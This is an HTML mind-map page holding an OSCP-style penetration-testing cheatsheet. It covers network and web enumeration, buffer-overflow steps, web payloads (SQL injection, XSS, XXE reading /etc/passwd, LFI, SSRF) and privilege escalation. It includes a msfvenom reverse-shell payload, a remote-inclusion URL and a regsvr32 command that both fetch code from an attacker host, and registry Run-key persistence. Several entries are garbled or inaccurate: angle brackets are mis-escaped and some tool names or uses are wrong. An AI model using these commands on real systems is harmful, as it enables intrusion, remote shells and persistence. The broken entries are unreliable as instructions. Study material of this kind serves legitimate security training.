<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>Mindmap</title><style>*{margin:0; padding:0}#markmap{display:block; width:100vw; height:100vh}</style></head><body><svg id="markmap"><use xlink:href=""><title>Mindmap</title></use><desc># OSCP Cheatsheet

## Enumeration
- **Network Scanning**
  - Nmap Scan: `nmap -sC -sV -oN scan_results.txt &lt;TARGET_IP&lt;`
  - SMB Enumeration: `enum4linux -a &lt;TARGET_IP&lt;`
  - SNMP Enumeration: `snmpwalk -c public -v1 &lt;TARGET_IP&lt;`
  - HTTP Enumeration: `nmap --script http-enum &lt;TARGET_IP&lt;`
  - DNS Enumeration: `dnsenum &lt;TARGET_IP&lt;`
  - SMTP Enumeration: `smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t &lt;TARGET_IP&lt;`
  - FTP Enumeration: `nmap --script ftp-anon.nse &lt;TARGET_IP&lt;`
  - DNS Zone Transfer: `dig axfr @&lt;DNS_IP&lt; &lt;DOMAIN&lt;`
- **Web Application Enumeration**
  - Directory Brute Forcing: `dirb http://&lt;TARGET_IP&lt;`
  - Nikto Scan: `nikto -h http://&lt;TARGET_IP&lt;`
  - GoBuster: `gobuster dir -u http://&lt;TARGET_IP&lt; -w /usr/share/wordlists/dirb/common.txt`
  - Burp Suite Spidering: Use Burp Suite GUI to spider the web application
  - OWASP ZAP Scanning: `zap-cli -–zap-url http://localhost -–zap-api-key &lt;API_KEY&lt; --spider &lt;TARGET_IP&lt;`
  - Subdomain Enumeration: `sublist3r -d &lt;TARGET_DOMAIN&lt;`
  - SSL Certificate Enumeration: `openssl s_client -connect &lt;TARGET_IP&lt;:443`
  - HTTP Method Enumeration: `curl -X OPTIONS http://&lt;TARGET_IP&lt;`
- **FTP Enumeration**
  - Anonymous Login: `ftp &lt;TARGET_IP&lt;`
  - Directory Listing: `ls`
  - Check Write Permissions: `ls -la`
  - Check Transfer Mode: `ftp -n &lt;TARGET_IP&lt; 21`
  - Check Banner: `nc -nv &lt;TARGET_IP&lt; 21`
  - Check for Anonymous Upload: `ftp &lt;TARGET_IP&lt;; anonymous; put /etc/passwd`
  - FTP Bounce Attack: `nc -nv &lt;TARGET_IP&lt; 21`
- **SSH Enumeration**
  - Weak Passwords: `hydra -l &lt;USERNAME&lt; -P &lt;WORDLIST&lt; ssh://&lt;TARGET_IP&lt;`
  - SSH Key Authentication: `ssh -i &lt;PRIVATE_KEY&lt; &lt;USERNAME&lt;@&lt;TARGET_IP&lt;`
  - SSH Configuration: `cat /etc/ssh/sshd_config`
  - Check Remote Forwarding: `ssh -R 80:localhost:80 &lt;TARGET_IP&lt;`
  - Check Local Forwarding: `ssh -L 80:localhost:80 &lt;TARGET_IP&lt;`

## Exploitation
- **Buffer Overflows**
  - Fuzzing: `msf-pattern_create -l &lt;length&lt;`
  - Finding Offset: `msf-pattern_offset -q &lt;EIP_value&lt;`
  - Exploitation: `msf-exploit suggester`
  - Finding Bad Characters: `!mona findmsp -length &lt;PAYLOAD_SIZE&lt;`
  - Generating Shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&lt; LPORT=&lt;ATTACKER_PORT&lt; -f &lt;FORMAT&lt; -b "&lt;BAD_CHARACTERS&lt;"`
  - Exploit Development: Use Immunity Debugger and Mona script
  - Remote Buffer Overflow: `nc -nv &lt;TARGET_IP&lt; &lt;PORT&lt;`
- **Web Application Exploitation**
  - SQL Injection: `' OR 1=1--`
  - Command Injection: `;ls`
  - XSS Payloads: `&lt;script&lt;alert('XSS')&lt;/script&lt;`
  - Local File Inclusion: `../../../etc/passwd`
  - Remote File Inclusion: `http://&lt;ATTACKER_IP&lt;/malicious.php`
  - Server-Side Template Injection: `{{7*7}}`
  - XML External Entity (XXE) Injection: `&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&lt; &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&lt; ]&lt;&lt;foo&lt;&amp;xxe;&lt;/foo&lt;`
  - Server-Side Request Forgery (SSRF): `http://localhost/admin`
- **Privilege Escalation**
  - Kernel Exploits: `searchsploit &lt;KERNEL_VERSION&lt;`
  - SUID Binaries: `find / -perm -u=s -type f 2&lt;/dev/null`
  - Sudo Abuse: `sudo -l`
  - Exploiting Unquoted Service Paths: Use PowerUp.ps1 script
  - DLL Hijacking: `regsvr32 /s /u /i:http://&lt;ATTACKER_IP&lt;/evil.dll`
  - Registry Hijacking: `reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /v &lt;NAME&lt; /d &lt;PAYLOAD&lt;`
